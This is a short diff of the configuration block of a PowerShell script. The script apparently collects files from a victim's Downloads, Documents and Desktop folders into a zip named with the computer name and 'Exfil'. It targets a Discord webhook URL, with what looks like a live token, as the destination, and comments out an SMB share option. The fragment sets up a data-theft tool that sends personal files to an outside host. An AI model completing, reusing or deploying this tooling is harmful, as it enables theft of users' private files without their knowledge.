@@ -1,6 +1,6 @@
 # Configuration
 $hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
-$smbShare = "\\192.168.1.100\share"  # Optional SMB path
+# $smbShare = "\\192.168.1.100\share"  # Optional SMB path
 $userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
 $zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
 
